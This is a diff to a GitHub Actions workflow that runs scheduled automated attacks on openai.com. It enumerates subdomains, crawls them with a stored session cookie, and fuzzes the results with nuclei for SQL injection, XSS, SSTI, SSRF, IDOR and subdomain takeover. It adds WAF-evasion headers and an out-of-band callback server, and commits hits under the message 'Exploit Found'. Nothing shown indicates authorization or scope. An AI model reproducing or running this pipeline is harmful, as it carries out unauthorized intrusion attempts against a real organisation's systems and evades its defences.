@@ -1,4 +1,4 @@
-name: "Elite Exploit & Recon Engine 2026"
+name: "Elite Authenticated Engine 2026 - Optimized"
 
 on:
   schedule:
@@ -9,13 +9,11 @@ permissions:
   contents: write
 
 jobs:
-  # STEP 1: DEEP RECON (Subdomains & Crawling)
   recon:
     runs-on: ubuntu-latest
-    outputs:
-      params_file: ${{ steps.crawl.outputs.params }}
     steps:
       - uses: actions/checkout@v4
+      
       - name: Install Tools
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
@@ -23,61 +21,77 @@ jobs:
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
           echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Subdomain & Param Discovery
-        id: crawl
+      - name: Incremental Discovery
+        env:
+          COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
           mkdir -p output/
+          # Move old results to compare
+          mv output/params.txt output/params_old.txt || touch output/params_old.txt
+          
+          # Fresh Recon
           subfinder -d openai.com -silent | httpx -silent -o output/alive.txt
-          # WAF-Safe Crawling with custom headers
-          katana -list output/alive.txt -jc -kf all -d 3 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -o output/params.txt
-          echo "params=output/params.txt" >> $GITHUB_OUTPUT
+          
+          # Katana with Authenticated Cookies
+          katana -list output/alive.txt -jc -kf all -d 3 \
+            -H "Cookie: $COOKIE" \
+            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0" \
+            -o output/params_new.txt
+          
+          # DELTA LOGIC: Only keep lines that are NOT in params_old.txt
+          grep -vFf output/params_old.txt output/params_new.txt > output/params_to_scan.txt || cp output/params_new.txt output/params_to_scan.txt
+          
+          # Rebuild the main params file for next time
+          cat output/params_old.txt output/params_to_scan.txt | sort -u > output/params.txt
 
-      - name: Archive Recon
+      - name: Archive Delta Data
         uses: actions/upload-artifact@v4
         with:
-          name: recon-data
-          path: output/
+          name: delta-recon
+          path: output/params_to_scan.txt
 
-  # STEP 2: PARALLEL FUZZING (SQLi, XSS, SSTI, SSRF)
   fuzz:
     needs: recon
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        vuln_type: [sqli, xss, ssti, ssrf]
+        # Added 'takeover' and 'idor' specific tags
+        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
     steps:
       - uses: actions/checkout@v4
       - uses: actions/download-artifact@v4
         with:
-          name: recon-data
+          name: delta-recon
           path: output/
       
       - name: Install Nuclei
         run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Run Targeted Fuzzing
+      - name: Targeted Injection
         env:
           ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
+          COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          # Bypassing WAF via Header Manipulation & OAST Fallback
-          # Using oast.fun/oast.me pool if default is down
-          nuclei -l output/params.txt \
+          # Only scan the new 'delta' parameters to save hours of time
+          nuclei -l output/params_to_scan.txt \
             -tags ${{ matrix.vuln_type }},dast \
             -interactsh-server oast.fun \
             -itoken $ISH_TOKEN \
+            -header "Cookie: $COOKIE" \
             -header "X-Forwarded-For: 127.0.0.1" \
-            -header "X-Originating-IP: 127.0.0.1" \
-            -header "X-Remote-IP: 127.0.0.1" \
-            -rate-limit 100 \
+            -rate-limit 150 \
+            -bulk-size 25 \
+            -concurrency 50 \
             -o output/${{ matrix.vuln_type }}_hits.txt
 
-      - name: Save Findings
+      - name: Push Hits Only
         run: |
           git config --local user.email "bot@recon.ai"
           git config --local user.name "Exploit-Bot"
-          git pull origin main
-          git add output/
-          git commit -m "Vuln Found: ${{ matrix.vuln_type }} $(date)" || echo "No new hits"
-          git push
+          git pull origin main --rebase
+          # Only add the hit files and the updated params list
+          git add output/*.txt
+          git commit -m "Exploit Found: ${{ matrix.vuln_type }} $(date)" || echo "No new hits"
+          git push origin main
           
